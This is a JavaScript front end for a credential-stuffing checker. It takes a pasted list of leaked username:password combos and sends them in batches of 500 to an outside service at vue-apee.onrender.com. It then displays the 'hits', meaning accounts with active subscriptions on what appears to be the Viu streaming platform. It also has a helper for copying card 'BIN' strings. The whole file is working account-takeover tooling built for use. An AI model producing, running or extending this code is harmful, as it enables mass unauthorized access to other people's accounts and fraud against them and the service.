document.addEventListener('DOMContentLoaded', function () {
    var checkBtn = document.getElementById("checkBtn");
    var comboList = document.getElementById('comboList');
    var bankNameElement = document.getElementById('bankName');

    comboList.addEventListener('input', function () {
        var credentials = comboList.value.split('\n');
        var totalCredentials = credentials.length;
        bankNameElement.textContent = `0/${totalCredentials}`;
    });

    checkBtn.addEventListener('click', async function () {
        const comboList = document.getElementById('comboList');
        const credentials = comboList.value.split('\n');
        const hitsOutput = document.getElementById('hitsOutputs');
        const bankName = document.getElementById('bankName');
        hitsOutput.innerHTML = '';

        const batchSize = 500;
        const totalBatches = Math.ceil(credentials.length / batchSize);
        let totalCredentials = credentials.length;
        let checkedCount = 0;
        try {
            let hitCount = 0;
            for (let i = 0; i < totalBatches; i++) {
                const startIndex = i * batchSize;
                const endIndex = Math.min(startIndex + batchSize, credentials.length);
                const batchCredentials = credentials.slice(startIndex, endIndex);

                const requests = batchCredentials.map(cred => axios.get(`https://vue-apee.onrender.com/viucheck?creds=${encodeURIComponent(cred)}`));
                const responses = await Promise.all(requests);

                responses.forEach(response => {
                    checkedCount++;
                    bankName.textContent = `${checkedCount}/${totalCredentials}`;

                    if (typeof response.data === 'string' && response.data.includes('✔️')) {
                        hitCount++;
                        hitsOutput.innerHTML += `
                            <div class="card mx-auto">
                                <div class="card-body text-center">
                                    ${response.data}
                                </div>
                            </div>
                        `;
                    }
                });

                // Remove processed lines from the textarea
                comboList.value = credentials.slice(endIndex).join('\n');
            }

            if (hitCount === 0) {
                hitsOutput.innerHTML = 'No active subscriptions found.';
            }
        } catch (error) {
            console.error(error);
            hitsOutput.innerHTML = 'An error occurred while checking the credentials.';
        }
    });
});

function showToast(checkDigit) {
    const toast = document.getElementById('toast');
    toast.style.display = 'block';
    toast.style.opacity = 1;
    toast.style.bottom = '40px';
    toast.style.zIndex = 9999;
    toast.textContent = "Copied to clipboard! " + checkDigit;

    setTimeout(() => {
        toast.style.opacity = 0;
        toast.style.bottom = '20px';
        setTimeout(() => {
            toast.style.display = 'none';
        }, 500);
    }, 2000);
}

function copyToClipboard(bin) {
    let copyBin = bin.split('|')[0];
    navigator.clipboard.writeText(copyBin).then(() => {
        showToast(copyBin);
    }).catch(err => {
        console.error('Error in copying text: ', err);
    });
}
